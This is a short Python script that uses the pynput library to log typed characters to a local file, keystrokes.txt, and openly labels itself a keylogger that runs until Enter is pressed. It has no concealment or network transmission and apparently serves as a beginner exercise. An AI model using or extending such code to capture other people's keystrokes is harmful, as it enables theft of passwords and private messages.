#installing pynput
from pynput import keyboard

# txt file has been created
log_file = open("keystrokes.txt", "a")  # Append mode


def when_key_is_pressed(key):
    if hasattr(key, 'char') and key.char is not None:
        log_file.write(key.char)

# Start listening to the keyboard
listener = keyboard.Listener(on_press=when_key_is_pressed)
listener.start()

# program will run until you press enter
input(" Keylogger running... Press Enter to stop.\n")


log_file.close()
#the output is saved in keystrokes.txt file
print(" Keylogger stopped. Keystrokes saved.")
